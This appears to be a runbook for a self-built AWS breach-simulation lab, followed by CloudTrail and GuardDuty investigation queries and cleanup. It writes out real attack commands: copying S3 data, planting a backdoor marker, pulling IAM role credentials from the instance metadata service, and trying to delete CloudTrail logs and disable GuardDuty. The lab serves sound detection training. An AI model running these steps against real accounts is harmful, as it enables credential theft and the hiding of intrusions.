# Attack Simulation Runbook

Run these commands from inside an SSM session on the EC2 instance.  
**Prerequisites:** Overpermissive IAM policy must be active (see `attack_simulation.tf`).

---

## Connect to EC2

```bash
aws ssm start-session --target <ec2-instance-id>
```

---

## Phase 1 — Reconnaissance

```bash
# Enumerate all buckets in the account
aws s3 ls

# List sensitive bucket contents
aws s3 ls s3://breach-lab-sensitive-<suffix>/
# Expected: AccessDenied

# List data bucket contents
aws s3 ls s3://breach-lab-data-<suffix>/
# Expected: Success
```

---

## Phase 2 — Data Exfiltration

```bash
# Try to pull credential file from sensitive bucket
aws s3 cp s3://breach-lab-sensitive-<suffix>/credentials/db-password.txt /tmp/stolen.txt
# Expected: AccessDenied

# Exfiltrate from data bucket (succeeds)
aws s3 cp s3://breach-lab-data-<suffix>/testfile.txt /tmp/exfiltrated.txt
cat /tmp/exfiltrated.txt

# Write backdoor marker
echo "attacker was here" > /tmp/backdoor.txt
aws s3 cp /tmp/backdoor.txt s3://breach-lab-data-<suffix>/backdoor.txt
# Expected: Success
```

---

## Phase 3 — Credential Harvest via IMDS

```bash
# IMDSv2 — get token first
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Get role name
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)

echo "Role: $ROLE"

# Get temporary credentials
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration
```

---

## Phase 4 — Cover Tracks (all blocked)

```bash
# Try to delete CloudTrail logs
aws s3 rm s3://breach-lab-logs-<suffix>/ --recursive
# Expected: AccessDenied on every object

# Try to stop CloudTrail
aws cloudtrail stop-logging --name breach-lab-trail
# Expected: AccessDenied

# Try to disable GuardDuty
aws guardduty delete-detector --detector-id <detector-id>
# Expected: AccessDenied
```

---

## Phase 5 — Verify IMDSv2 Enforcement

```bash
# IMDSv1 — must fail
curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/
# Expected: no response or 401

# IMDSv2 — must succeed
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Expected: role name returned
```

---

## Investigation — CloudTrail Queries (run from local machine)

```bash
# Full event chain from EC2 role
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=breach-lab-ec2-role \
  --start-time $(date -u -d '2 hours ago' '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null || \
                date -u -v-2H '+%Y-%m-%dT%H:%M:%SZ') \
  --query 'Events[*].{Time:EventTime, Event:EventName}' \
  --output table

# Check GuardDuty findings
DETECTOR_ID=$(aws guardduty list-detectors --query 'DetectorIds[0]' --output text)
aws guardduty list-findings --detector-id $DETECTOR_ID --output table

# Read raw log file (has error codes the API strips out)
aws s3 ls s3://breach-lab-logs-<suffix>/cloudtrail/ --recursive | tail -5
aws s3 cp s3://breach-lab-logs-<suffix>/cloudtrail/AWSLogs/<account>/.../file.json.gz /tmp/trail.json.gz
gunzip /tmp/trail.json.gz
cat /tmp/trail.json | python3 -m json.tool | grep -A 20 '"errorCode": "AccessDenied"'
```

---

## Cleanup After Simulation

```bash
# Remove attacker artifact
aws s3 rm s3://breach-lab-data-<suffix>/backdoor.txt

# Re-enable least privilege IAM:
# 1. Comment out the block in attack_simulation.tf
# 2. Uncomment aws_iam_policy.ec2_s3_policy in main.tf
# 3. Run: terraform apply
```
